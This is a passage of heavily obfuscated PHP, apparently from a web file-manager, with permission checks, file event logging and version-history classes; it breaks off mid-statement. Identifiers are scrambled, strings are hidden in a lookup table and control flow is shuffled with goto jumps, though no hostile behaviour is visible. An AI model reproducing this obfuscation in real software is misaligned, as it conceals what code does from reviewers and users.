$dÖÚé‹ğ·®; } goto F§ö‡´¾¶à; F§ö‡´¾¶à: $AİÕ•“ÒÇß = Model($B÷ÒòŒæÑ‹[1121])->parentLevelArray($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[467]]); $AİÕ•“ÒÇß = array_merge(array($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[377]]), array_reverse($AİÕ•“ÒÇß)); $eËø÷Û×†× = $B÷ÒòŒæÑ‹[2257]; goto FµÊ£·Ü†„; b±ÆÁ•Ğö: $cåÖÖÑó‘Ï = array(); $D¯øˆ‘âŒĞ = array(); foreach ($D‰˜ÌİÊß‹ as $FŒÊ¢ˆÔ… => $bÈà•‚Æ¶ê) { $E‰²ƒ÷¾´Ñ = $this->authFolderOwnerUser($bÈà•‚Æ¶ê); $cåÖÖÑó‘Ï[$FŒÊ¢ˆÔ…] = $E‰²ƒ÷¾´Ñ; $D¯øˆ‘âŒĞ = array_merge($D¯øˆ‘âŒĞ, $E‰²ƒ÷¾´Ñ[$B÷ÒòŒæÑ‹[543]]); if ($E‰²ƒ÷¾´Ñ[$B÷ÒòŒæÑ‹[2274]]) { break; } } goto c•Ù«ÑÜù; dĞÙÁÛƒ¯‹: $dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[384]][$B÷ÒòŒæÑ‹[2275]] = Model($B÷ÒòŒæÑ‹[482])->userListInfo($D¯øˆ‘âŒĞ); return $dÖÚé‹ğ·®; goto fŞ“×‡ÕÓÒ; c•Ù«ÑÜù: if (count($D¯øˆ‘âŒĞ) == 0) { $D¯øˆ‘âŒĞ = $this->authFolderOwnerGroup($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[464]]); } $D¯øˆ‘âŒĞ = array_unique($D¯øˆ‘âŒĞ); if (AuthModel::authCheckRoot($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[384]][$B÷ÒòŒæÑ‹[385]])) { $D¯øˆ‘âŒĞ[] = USER_ID; } goto dĞÙÁÛƒ¯‹; fŞ“×‡ÕÓÒ: } private function authFolderOwnerGroup($FâõÃŠÁ‘Ş) { $A…²ÎÎ¯ğ“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e”©é®İŒØ = Model($A…²ÎÎ¯ğ“[2181])->where(array($A…²ÎÎ¯ğ“[2107] => $FâõÃŠÁ‘Ş))->select(); $F‘ÔŒäŒ = array(); if (!$e”©é®İŒØ) { return $F‘ÔŒäŒ; } foreach ($e”©é®İŒØ as $dÖÁ±ô‹±µ) { $a‰Éè«¤‹ = $this->authInfo($dÖÁ±ô‹±µ); if (AuthModel::authCheckRoot($a‰Éè«¤‹[$A…²ÎÎ¯ğ“[384]])) { $F‘ÔŒäŒ[] = $dÖÁ±ô‹±µ[$A…²ÎÎ¯ğ“[1440]]; } } return $F‘ÔŒäŒ; } private function authFolderOwnerUser($f¡ŒíÈİÔ) { $BÎõˆ¿ÙÇÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AãÀ‘Çåˆ¤ = array(); $AÇª‚²±»Á = !1; foreach ($f¡ŒíÈİÔ as $b«ì‘¡‰‚) { $aÂ­¡à÷…µ = $this->authInfo($b«ì‘¡‰‚); if ($b«ì‘¡‰‚[$BÎõˆ¿ÙÇÁ[464]] == $BÎõˆ¿ÙÇÁ[476]) { $AÇª‚²±»Á = !0; } if ($b«ì‘¡‰‚[$BÎõˆ¿ÙÇÁ[379]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($aÂ­¡à÷…µ[$BÎõˆ¿ÙÇÁ[384]])) { $AãÀ‘Çåˆ¤[] = $b«ì‘¡‰‚[$BÎõˆ¿ÙÇÁ[464]]; } } } return array($BÎõˆ¿ÙÇÁ[543] => $AãÀ‘Çåˆ¤, $BÎõˆ¿ÙÇÁ[2274] => $AÇª‚²±»Á); } public function authMake($BÚËôôÄ¸) { goto EëĞÜ­µŠÖ; d”ÈŞ¸­Å—: $fİ·»ÃÕ´ = 0; $bÍ­â£Áß = 0; $C„’­ç­¿ = 0; goto bÊª«ãÊ £; få „’¤òŠ: $cÑ«±öÈ´ = array_to_keyvalue($f¨›²£–š±, $Bò‡Æäóì[33], $Bò‡Æäóì[2107]); $F¦‡Şˆ•¯¾ = 0; $fÜƒ¾ç±À½ = 0; goto F ÔçªÉÓô; E‹äŒì÷øé: $fˆæª¼¾È = array($Bò‡Æäóì[2267] => intval($eœ«¨öÆ¡æ), $Bò‡Æäóì[2268] => $bƒİ›®×ğ, $Bò‡Æäóì[2262] => array($Bò‡Æäóì[396] => $bÖ©ÒÛ­ùÓ, $Bò‡Æäóì[85] => $e–†‰¤–—¿[$Bò‡Æäóì[377]])); return $fˆæª¼¾È; goto D§Õ²…Ğ‘è; EëĞÜ­µŠÖ: $Bò‡Æäóì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$BÚËôôÄ¸) { return array($Bò‡Æäóì[385] => 0, $Bò‡Æäóì[426] => !1); } $f¨›²£–š± = Session::get($Bò‡Æäóì[2219]); goto få „’¤òŠ; F ÔçªÉÓô: $cÜËØ¡Ö„„ = 0; $AĞÊ›ã¸ò‡ = 0; $E·ÈÀá¡«ì = 0; goto d”ÈŞ¸­Å—; a„ªâ®ò±: $eœ«¨öÆ¡æ = $bÍ­â£Áß ? $F¦‡Şˆ•¯¾ : ($C„’­ç­¿ ? $fÜƒ¾ç±À½ : $cÜËØ¡Ö„„); $bƒİ›®×ğ = $bÍ­â£Áß ? $AĞÊ›ã¸ò‡ : ($C„’­ç­¿ ? $E·ÈÀá¡«ì : $fİ·»ÃÕ´); $bÖ©ÒÛ­ùÓ = $bÍ­â£Áß ? $Bò‡Æäóì[2276] : ($C„’­ç­¿ ? $Bò‡Æäóì[2277] : ($AİŠ™”½æ¥ ? $Bò‡Æäóì[2278] : $Bò‡Æäóì[66])); goto E‹äŒì÷øé; bÊª«ãÊ £: $AİŠ™”½æ¥ = 0; $e–†‰¤–—¿ = array($Bò‡Æäóì[377] => 0); foreach ($BÚËôôÄ¸ as $e–†‰¤–—¿) { $bƒİ›®×ğ = $this->authInfo($e–†‰¤–—¿); $Dã‘çÕ‹òÚ = $e–†‰¤–—¿[$Bò‡Æäóì[464]]; $EæäìÄÁòº = intval($bƒİ›®×ğ[$Bò‡Æäóì[384]]); if ($e–†‰¤–—¿[$Bò‡Æäóì[379]] == SourceModel::TYPE_USER && $Dã‘çÕ‹òÚ == USER_ID) { $bÍ­â£Áß = !0; $AĞÊ›ã¸ò‡ = $bƒİ›®×ğ; $F¦‡Şˆ•¯¾ = $EæäìÄÁòº; } else { if ($e–†‰¤–—¿[$Bò‡Æäóì[379]] == SourceModel::TYPE_GROUP && in_array($Dã‘çÕ‹òÚ, $cÑ«±öÈ´)) { $C„’­ç­¿ = !0; if ($EæäìÄÁòº >= $fÜƒ¾ç±À½) { $fÜƒ¾ç±À½ = $EæäìÄÁòº; $E·ÈÀá¡«ì = $bƒİ›®×ğ; } } else { if ($Dã‘çÕ‹òÚ == $Bò‡Æäóì[476]) { $AİŠ™”½æ¥ = !0; $fİ·»ÃÕ´ = $bƒİ›®×ğ; $cÜËØ¡Ö„„ = $EæäìÄÁòº; } } } } goto a„ªâ®ò±; D§Õ²…Ğ‘è: } public function authTargetInfoMake($A››Çš¡¸Î) { goto e¾åÈ‘Çß; b”ñŞ¨‹¤¿: foreach ($A››Çš¡¸Î as $f…¸Èîç±±) { if ($f…¸Èîç±±[$fà‚êÕĞÈ°[379]] == SourceModel::TYPE_USER) { $c¢’ä‹ó±[] = intval($f…¸Èîç±±[$fà‚êÕĞÈ°[464]]); } else { if ($f…¸Èîç±±[$fà‚êÕĞÈ°[379]] == SourceModel::TYPE_GROUP) { $aĞ £Àè‚¼[] = intval($f…¸Èîç±±[$fà‚êÕĞÈ°[464]]); } } } if ($c¢’ä‹ó±) { $c¢’ä‹ó± = Model($fà‚êÕĞÈ°[482])->userListInfo($c¢’ä‹ó±); } if ($aĞ £Àè‚¼) { $b¨ª¶ˆÑ†Õ = array($fà‚êÕĞÈ°[2179] => array($fà‚êÕĞÈ°[392], $aĞ £Àè‚¼)); $aĞ £Àè‚¼ = Model($fà‚êÕĞÈ°[466])->field($fà‚êÕĞÈ°[2192])->where($b¨ª¶ˆÑ†Õ)->select(); $aĞ £Àè‚¼ = array_to_keyvalue($aĞ £Àè‚¼, $fà‚êÕĞÈ°[2107]); } goto f”ã× ¬ÃÇ; f”ã× ¬ÃÇ: return array($fà‚êÕĞÈ°[2279] => $c¢’ä‹ó±, $fà‚êÕĞÈ°[2271] => $aĞ £Àè‚¼); goto e¹¢¹º½ğ­; e¾åÈ‘Çß: $fà‚êÕĞÈ° =& $_SERVER[¶ªÕß‚ØÁŸ]; $c¢’ä‹ó± = array(); $aĞ £Àè‚¼ = array(); goto b”ñŞ¨‹¤¿; e¹¢¹º½ğ­: } private function authInfo($eº”šˆÀ×Î) { $Cîê»×„£ó =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($eº”šˆÀ×Î[$Cîê»×„£ó[2235]]) { $FØğÒÛ¡¸Ä = Model($Cîê»×„£ó[2254])->listData($eº”šˆÀ×Î[$Cîê»×„£ó[2235]]); if (!$FØğÒÛ¡¸Ä) { return !1; $eÛ“Ö•—ùÉ = Model($Cîê»×„£ó[2254])->listData(); $bˆÉ³áŸ = array_filter_by_field($eÛ“Ö•—ùÉ, $Cîê»×„£ó[384], $Cîê»×„£ó[476]); return $bˆÉ³áŸ; } $cÊÇ×Üéœ = array_field_key($FØğÒÛ¡¸Ä, array($Cîê»×„£ó[375], $Cîê»×„£ó[28], $Cîê»×„£ó[384], $Cîê»×„£ó[2125], $Cîê»×„£ó[2128])); $cÊÇ×Üéœ[$Cîê»×„£ó[2280]] = $eº”šˆÀ×Î; return $cÊÇ×Üéœ; } else { return array($Cîê»×„£ó[393] => 0, $Cîê»×„£ó[2113] => $eº”šˆÀ×Î[$Cîê»×„£ó[2236]], $Cîê»×„£ó[394] => $Cîê»×„£ó[33], $Cîê»×„£ó[2125] => $Cîê»×„£ó[2281]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\145\137\x65\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\124\x69\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\144\x65\163\x63", '', "\151\x6e\x73\x65\162\x74\54\x75\x70\144\x61\x74\x65\54\x73\x65\x6c\145\x63\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($aøÉªò°éå, $CÂ‡—Ç°¤á, $Bàâ¢Ÿ– = '') { goto aÉ„Úæ¾î°; céº…ÒÎ¨: if (!$BÁùˆï°¶·) { return !1; } if ($this->isCacheEvent($BÁùˆï°¶·, $CÂ‡—Ç°¤á)) { return; } if ($Bàâ¢Ÿ– && is_string($Bàâ¢Ÿ–)) { $Bàâ¢Ÿ– = array($D¢ÑæÁô‘‘[2137] => $Bàâ¢Ÿ–); } goto aè‡ÃÀµï; aÉ„Úæ¾î°: $D¢ÑæÁô‘‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->eventSave) { return; } $BÁùˆï°¶· = Model($D¢ÑæÁô‘‘[1121])->sourceInfo($aøÉªò°éå); goto céº…ÒÎ¨; aè‡ÃÀµï: $BŒÇˆğà¯ = array($D¢ÑæÁô‘‘[391] => $aøÉªò°éå, $D¢ÑæÁô‘‘[2282] => $BÁùˆï°¶·[$D¢ÑæÁô‘‘[469]], $D¢ÑæÁô‘‘[2283] => $BÁùˆï°¶·[$D¢ÑæÁô‘‘[28]], $D¢ÑæÁô‘‘[474] => $BÁùˆï°¶·[$D¢ÑæÁô‘‘[474]], $D¢ÑæÁô‘‘[1431] => USER_ID, $D¢ÑæÁô‘‘[396] => $CÂ‡—Ç°¤á, $D¢ÑæÁô‘‘[1433] => $Bàâ¢Ÿ–); $this->addSystemLog($CÂ‡—Ç°¤á, $BŒÇˆğà¯); return $this->add($BŒÇˆğà¯); goto F•âƒ‰¡‹; F•âƒ‰¡‹: } private function addSystemLog($cÇáÂ¦‚êÓ, $a¿Á èÏáù) { $B‡‡«ÖßØš =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($cÇáÂ¦‚êÓ == $B‡‡«ÖßØš[2284]) { $cÇáÂ¦‚êÓ = $a¿Á èÏáù[$B‡‡«ÖßØš[413]][$B‡‡«ÖßØš[2285]]; } else { if (in_array($cÇáÂ¦‚êÓ, array($B‡‡«ÖßØš[2084], $B‡‡«ÖßØš[2286]))) { $cÇáÂ¦‚êÓ = $a¿Á èÏáù[$B‡‡«ÖßØš[413]][$B‡‡«ÖßØš[705]]; } } $Có¼Œ¡‚•‚ = array_merge($a¿Á èÏáù, array($B‡‡«ÖßØš[2287] => $a¿Á èÏáù[$B‡‡«ÖßØš[377]], $B‡‡«ÖßØš[2288] => $a¿Á èÏáù[$B‡‡«ÖßØš[2288]])); Model($B‡‡«ÖßØš[2048])->addLog($B‡‡«ÖßØš[2289] . $cÇáÂ¦‚êÓ, $Có¼Œ¡‚•‚); } private function isCacheEvent($d¸Ğ´£İ³, $a´Î¼çº»¥) { if ($d¸Ğ´£İ³[$_SERVER[¶ªÕß‚ØÁŸ][379]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($bœ”òµ×Ìâ, $eÖ‚•Ñà‹–) { $eÜßğÀ—Ùï =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¾ìÍ’£­È = Model($eÜßğÀ—Ùï[1121])->sourceInfo($bœ”òµ×Ìâ); $Då‘¬ªïßî = array($eÜßğÀ—Ùï[2285] => $eÖ‚•Ñà‹–, $eÜßğÀ—Ùï[28] => $B¾ìÍ’£­È[$eÜßğÀ—Ùï[28]]); return $this->addEvent($bœ”òµ×Ìâ, $eÜßğÀ—Ùï[2284], $Då‘¬ªïßî); } public function eventFileEdit($BåôÖ‚îô¥) { $c’Î½—× =& $_SERVER[¶ªÕß‚ØÁŸ]; $FßÜ©¯Æè = array($c’Î½—×[2290] => $_SERVER[$c’Î½—×[2291]], $c’Î½—×[1754] => strtolower(ACTION)); return $this->addEvent($BåôÖ‚îô¥, $c’Î½—×[2075], $FßÜ©¯Æè); } public function eventRecycle($Cì²¬«äÌ‹, $AÜ¤ˆ›àª²) { return $this->addEvent($Cì²¬«äÌ‹, $_SERVER[¶ªÕß‚ØÁŸ][2286], $AÜ¤ˆ›àª²); } public function eventRemove($DêÒ’õâÎ÷) { $BÍ¦ºá«½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÎÛøõæ†• = Model($BÍ¦ºá«½[1121])->sourceInfo($DêÒ’õâÎ÷); $F„÷“»êÚ = $fÎÛøõæ†•[$BÍ¦ºá«½[28]]; return $this->addEvent($fÎÛøõæ†•[$BÍ¦ºá«½[469]], $BÍ¦ºá«½[2074], $F„÷“»êÚ); } public function eventShare($cÌÌ˜öá, $E«·ëŠÜæ¯) { return $this->addEvent($cÌÌ˜öá, $_SERVER[¶ªÕß‚ØÁŸ][2084], $E«·ëŠÜæ¯); } public function eventMove($AË¢‹“ºÒá, $F¼¤µÉ¶‰, $e¸»ô¦¬) { goto d‡£È¾øªõ; dƒÊ¼ñæ—ó: $this->addEvent($AË¢‹“ºÒá, $B·§£‡‚[500], $bÚ°Û÷Õê‚); $F‰À‘¯îÑÆ = $cˆ±›Ö‚ƒ->sourceInfo($AË¢‹“ºÒá); $bÚ°Û÷Õê‚ = array($B·§£‡‚[377] => $F‰À‘¯îÑÆ[$B·§£‡‚[377]], $B·§£‡‚[28] => $F‰À‘¯îÑÆ[$B·§£‡‚[28]]); goto Dô§ß”İ§; b¾‚‰íùƒİ: $EÅ ˆ‡ÇÀ² = $cˆ±›Ö‚ƒ->sourceInfo($F¼¤µÉ¶‰); $Bê²°øÅà‰ = $cˆ±›Ö‚ƒ->sourceInfo($e¸»ô¦¬); $bÚ°Û÷Õê‚ = array($B·§£‡‚[1010] => $F¼¤µÉ¶‰, $B·§£‡‚[2292] => $EÅ ˆ‡ÇÀ²[$B·§£‡‚[28]], $B·§£‡‚[2293] => $EÅ ˆ‡ÇÀ²[$B·§£‡‚[474]], $B·§£‡‚[1011] => $e¸»ô¦¬, $B·§£‡‚[2294] => $Bê²°øÅà‰[$B·§£‡‚[28]], $B·§£‡‚[2295] => $Bê²°øÅà‰[$B·§£‡‚[474]]); goto dƒÊ¼ñæ—ó; Dô§ß”İ§: $this->addEvent($F¼¤µÉ¶‰, $B·§£‡‚[2296], $bÚ°Û÷Õê‚); goto F†™‰Ü‰¸; d‡£È¾øªõ: $B·§£‡‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cˆ±›Ö‚ƒ = Model($B·§£‡‚[1121]); $F‰À‘¯îÑÆ = $cˆ±›Ö‚ƒ->sourceInfo($AË¢‹“ºÒá); goto b¾‚‰íùƒİ; F†™‰Ü‰¸: } public function eventCopy($cí­Ï¤ë°) { $this->eventCreate($cí­Ï¤ë°, $_SERVER[¶ªÕß‚ØÁŸ][498]); } public function eventRename($A¯ô•ë„Ï, $B¿â‚¿‚Ä¨, $D£Š¼©·‹Ø) { $d¯ÕÖÒ…ëÖ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c­¨™±ğÈ± = array($d¯ÕÖÒ…ëÖ[1010] => $B¿â‚¿‚Ä¨, $d¯ÕÖÒ…ëÖ[1011] => $D£Š¼©·‹Ø); return $this->addEvent($A¯ô•ë„Ï, $d¯ÕÖÒ…ëÖ[1133], $c­¨™±ğÈ±); } public function eventAddComment($a°Ë‡ÅåÏ, $A¢©ÊÑ°óÑ) { return $this->addEvent($a°Ë‡ÅåÏ, $_SERVER[¶ªÕß‚ØÁŸ][2297], $A¢©ÊÑ°óÑ); } public function eventAddDesc($D˜¢Ë—ÌãĞ, $dóáŞ‹…è¥) { return $this->addEvent($D˜¢Ë—ÌãĞ, $_SERVER[¶ªÕß‚ØÁŸ][2298], $dóáŞ‹…è¥); } public function listBySource($bÀˆï¡×¼) { goto E¿ù¤Îç„…; E¿ù¤Îç„…: $aŒ¤Â¸îìŠ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¬…ÅÇÖƒî = Model($aŒ¤Â¸îìŠ[1121])->sourceInfo($bÀˆï¡×¼); $cÍá¬»ì = array($aŒ¤Â¸îìŠ[391] => $bÀˆï¡×¼); goto cÉÍÅ·„¦; eš«ƒ³•©: $eÓ¦ö–Õğ¸ = $this->eventListParse($eÓ¦ö–Õğ¸, $bÀˆï¡×¼); show_json($eÓ¦ö–Õğ¸); goto BÔ×Ÿº„ø†; cÉÍÅ·„¦: if ($C¬…ÅÇÖƒî[$aŒ¤Â¸îìŠ[378]] == $aŒ¤Â¸îìŠ[93]) { $fŞù™ƒÙ„ = Model($aŒ¤Â¸îìŠ[1121])->listSearchChildren($bÀˆï¡×¼, 20000); $fŞù™ƒÙ„[] = $bÀˆï¡×¼ . $aŒ¤Â¸îìŠ[66]; $cÍá¬»ì = array($aŒ¤Â¸îìŠ[377] => array($aŒ¤Â¸îìŠ[7], $fŞù™ƒÙ„)); } $eÓ¦ö–Õğ¸ = $this->where($cÍá¬»ì)->order($aŒ¤Â¸îìŠ[2299])->selectPage(); if ($eÓ¦ö–Õğ¸[$aŒ¤Â¸îìŠ[360]][$aŒ¤Â¸îìŠ[361]] == 0) { $eÓ¦ö–Õğ¸[$aŒ¤Â¸îìŠ[360]][$aŒ¤Â¸îìŠ[361]] = 1; $eÓ¦ö–Õğ¸[$aŒ¤Â¸îìŠ[363]] = array(array($aŒ¤Â¸îìŠ[391] => $bÀˆï¡×¼, $aŒ¤Â¸îìŠ[2282] => $C¬…ÅÇÖƒî[$aŒ¤Â¸îìŠ[469]], $aŒ¤Â¸îìŠ[1431] => $C¬…ÅÇÖƒî[$aŒ¤Â¸îìŠ[386]], $aŒ¤Â¸îìŠ[396] => $aŒ¤Â¸îìŠ[2300], $aŒ¤Â¸îìŠ[397] => $C¬…ÅÇÖƒî[$aŒ¤Â¸îìŠ[197]], $aŒ¤Â¸îìŠ[1433] => $aŒ¤Â¸îìŠ[33])); } goto eš«ƒ³•©; BÔ×Ÿº„ø†: } private function eventListParse($cÛğ¶›ê™Ï, $dâåòñ…‚£) { goto FÌãŞŠŸ£‘; FÌãŞŠŸ£‘: $B‰ì³È„…˜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÙÏœÄ¥—¯ = $cÛğ¶›ê™Ï[$B‰ì³È„…˜[363]]; $b‹ˆ£‘øò’ = array_to_keyvalue($AÙÏœÄ¥—¯, $B‰ì³È„…˜[33], $B‰ì³È„…˜[377]); goto F­äºÓ²ë; eö—„ñ‰ï: return $cÛğ¶›ê™Ï; goto CÂË™—®ƒò; dˆÉÉ¼Ø‘ä: $b‹ˆ£‘øò’ = array_unique($b‹ˆ£‘øò’); $BÆ‚„¨ß¸ = array_unique(array_to_keyvalue($AÙÏœÄ¥—¯, $B‰ì³È„…˜[33], $B‰ì³È„…˜[1440])); $DóÉ“é•³Š = Model($B‰ì³È„…˜[485])->userListInfo($BÆ‚„¨ß¸); goto bİà½Üõ„§; bİà½Üõ„§: $fØñÎèå÷ò = Model($B‰ì³È„…˜[766])->sourceListInfo($b‹ˆ£‘øò’, !0); foreach ($AÙÏœÄ¥—¯ as &$C Å»ëªö) { if ($C Å»ëªö[$B‰ì³È„…˜[29]] == $B‰ì³È„…˜[500] && isset($C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[1010]])) { $C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[1010]] = $fØñÎèå÷ò[$C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[1010]]]; $C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[1011]] = $fØñÎèå÷ò[$C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[1011]]]; } if ($C Å»ëªö[$B‰ì³È„…˜[29]] == $B‰ì³È„…˜[2296] && isset($C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[377]])) { $C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[377]] = $fØñÎèå÷ò[$C Å»ëªö[$B‰ì³È„…˜[413]][$B‰ì³È„…˜[377]]]; } $C Å»ëªö[$B‰ì³È„…˜[399]] = $fØñÎèå÷ò[$C Å»ëªö[$B‰ì³È„…˜[377]]]; $C Å»ëªö[$B‰ì³È„…˜[2301]] = $fØñÎèå÷ò[$C Å»ëªö[$B‰ì³È„…˜[2288]]]; if ($C Å»ëªö[$B‰ì³È„…˜[29]] == $B‰ì³È„…˜[2074]) { $C Å»ëªö[$B‰ì³È„…˜[2301]] = $C Å»ëªö[$B‰ì³È„…˜[399]]; $C Å»ëªö[$B‰ì³È„…˜[2288]] = $C Å»ëªö[$B‰ì³È„…˜[2301]][$B‰ì³È„…˜[377]]; $C Å»ëªö[$B‰ì³È„…˜[399]] = !1; $C Å»ëªö[$B‰ì³È„…˜[377]] = $B‰ì³È„…˜[33]; } $C Å»ëªö[$B‰ì³È„…˜[2244]] = $DóÉ“é•³Š[$C Å»ëªö[$B‰ì³È„…˜[1440]]]; } $cÛğ¶›ê™Ï[$B‰ì³È„…˜[363]] = $AÙÏœÄ¥—¯; goto eö—„ñ‰ï; F­äºÓ²ë: $b¢¦Ê“Ö¾î = array_to_keyvalue($AÙÏœÄ¥—¯, $B‰ì³È„…˜[33], $B‰ì³È„…˜[2288]); foreach ($AÙÏœÄ¥—¯ as $C Å»ëªö) { $DŞ‘º¹¨Æ = $C Å»ëªö[$B‰ì³È„…˜[413]]; if ($C Å»ëªö[$B‰ì³È„…˜[29]] == $B‰ì³È„…˜[500] && isset($DŞ‘º¹¨Æ[$B‰ì³È„…˜[1010]])) { $b‹ˆ£‘øò’[] = $DŞ‘º¹¨Æ[$B‰ì³È„…˜[1010]] . $B‰ì³È„…˜[33]; $b‹ˆ£‘øò’[] = $DŞ‘º¹¨Æ[$B‰ì³È„…˜[1011]] . $B‰ì³È„…˜[33]; } if ($C Å»ëªö[$B‰ì³È„…˜[29]] == $B‰ì³È„…˜[2296] && isset($DŞ‘º¹¨Æ[$B‰ì³È„…˜[377]])) { $b‹ˆ£‘øò’[] = $DŞ‘º¹¨Æ[$B‰ì³È„…˜[377]] . $B‰ì³È„…˜[33]; } } $b‹ˆ£‘øò’ = array_merge($b‹ˆ£‘øò’, $b¢¦Ê“Ö¾î, array($dâåòñ…‚£ . $B‰ì³È„…˜[33])); goto dˆÉÉ¼Ø‘ä; CÂË™—®ƒò: } public function removeBySource($b»·•ÛÇ¶í) { $d™÷…ÒíÈ = array($_SERVER[¶ªÕß‚ØÁŸ][391] => $b»·•ÛÇ¶í); $this->where($d™÷…ÒíÈ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145\x5f\150\151\163\x74\157\162\171"; public function addHistory($bÍÎäÜ‚Í›, $fö‚ÊÆÎƒ = '') { $E‡Ü¼©¤ëÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cñ…ŒÃ‘Æã = array($E‡Ü¼©¤ëÙ[391] => $bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[377]], $E‡Ü¼©¤ëÙ[1431] => isset($bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[387]]) ? $bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[387]] : $bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[386]], $E‡Ü¼©¤ëÙ[428] => $bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[427]], $E‡Ü¼©¤ëÙ[528] => $bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[87]], $E‡Ü¼©¤ëÙ[2302] => $fö‚ÊÆÎƒ); $d­ºÙÇîİË = $GLOBALS[$E‡Ü¼©¤ëÙ[6]][$E‡Ü¼©¤ëÙ[94]][$E‡Ü¼©¤ëÙ[2303]]; if ($d­ºÙÇîİË > 1) { $this->historyAutoClear($cñ…ŒÃ‘Æã[$E‡Ü¼©¤ëÙ[377]]); $this->add($cñ…ŒÃ‘Æã); } Model($E‡Ü¼©¤ëÙ[2304])->eventFileEdit($bÍÎäÜ‚Í›[$E‡Ü¼©¤ëÙ[377]]); } private function historyAutoClear($FØì…Š½) { goto F©ÉŸ—ÊØ; cª”ªˆÒ«Ü: if (!$A¥†×¤ùÓ¤ || $f…š Çò¥ >= count($A¥†×¤ùÓ¤)) { return; } $Eƒ–¬„”è = array_to_keyvalue($A¥†×¤ùÓ¤, $DŒÁõˆéô[33], $DŒÁõˆéô[375]); $Eƒ–¬„”è = array_slice($Eƒ–¬„”è, $f…š Çò¥); goto Cä¹İ›; E´åØ„°ˆ«: if ($f…š Çò¥ >= 500) { return; } $DÔø—†Ïù = array($DŒÁõˆéô[391] => $FØì…Š½); $A¥†×¤ùÓ¤ = $this->field($DŒÁõˆéô[2307])->where($DÔø—†Ïù)->order($DŒÁõˆéô[2299])->select(); goto cª”ªˆÒ«Ü; F©ÉŸ—ÊØ: $DŒÁõˆéô =& $_SERVER[¶ªÕß‚ØÁŸ]; $F¸ÇŒòŒ™¶ = Model($DŒÁõˆéô[1092])->get($DŒÁõˆéô[2305]); $c†Œ¯Õ•Øì = $GLOBALS[$DŒÁõˆéô[6]][$DŒÁõˆéô[94]][$DŒÁõˆéô[2303]]; goto aøĞ˜Ë›ˆ°; aøĞ˜Ë›ˆ°: $Eµñ¨ÈÑÌ‡ = $F¸ÇŒòŒ™¶ == $DŒÁõˆéô[2306] ? 3 : $c†Œ¯Õ•Øì; if ($c†Œ¯Õ•Øì <= 1) { $Eµñ¨ÈÑÌ‡ = 1; } $f…š Çò¥ = $Eµñ¨ÈÑÌ‡ - 1; goto E´åØ„°ˆ«; dÊÌ–¾•ìˆ: $DÔø—†Ïù = array($DŒÁõˆéô[393] => array($DŒÁõˆéô[7], $Eƒ–¬„”è)); $this->where($DÔø—†Ïù)->delete(); Model($DŒÁõˆéô[430])->remove($C¹¶ºÖ¿æ); goto bÓæ—…Ÿ«; Cä¹İ›: $C¹¶ºÖ¿æ = array_to_keyvalue($A¥†×¤ùÓ¤, $DŒÁõˆéô[33], $DŒÁõˆéô[427]); $C¹¶ºÖ¿æ = array_slice($C¹¶ºÖ¿æ, $f…š Çò¥); if (!$Eƒ–¬„”è || !$C¹¶ºÖ¿æ) { return; } goto dÊÌ–¾•ìˆ; bÓæ—…Ÿ«: } public function listData($e¢§ñ”ÎŒ‡) { goto dñ«ÔÆÛ†‡; dìåáÇ“‘Ä: $aŠˆÄšÆ¾À = $this->field($Dá±Èíğ©Ü)->where($E¢ïì“ò•†)->order($fùáÅÛÙæ¡[2299])->selectPage(); $this->_listAppendUser($aŠˆÄšÆ¾À[$fùáÅÛÙæ¡[363]]); $FÄ¨ÜŞÏğ½ = Model($fùáÅÛÙæ¡[1092])->get($fùáÅÛÙæ¡[2305]); goto fß“†²ñ–; fß“†²ñ–: $dÈß¤“Ûó¿ = 3; if ($FÄ¨ÜŞÏğ½ == $fùáÅÛÙæ¡[2306]) { $aŠˆÄšÆ¾À[$fùáÅÛÙæ¡[363]] = array_slice($aŠˆÄšÆ¾À[$fùáÅÛÙæ¡[363]], 0, $dÈß¤“Ûó¿); $aŠˆÄšÆ¾À[$fùáÅÛÙæ¡[360]] = array($fùáÅÛÙæ¡[2309] => 1, $fùáÅÛÙæ¡[2310] => 20, $fùáÅÛÙæ¡[2311] => 1, 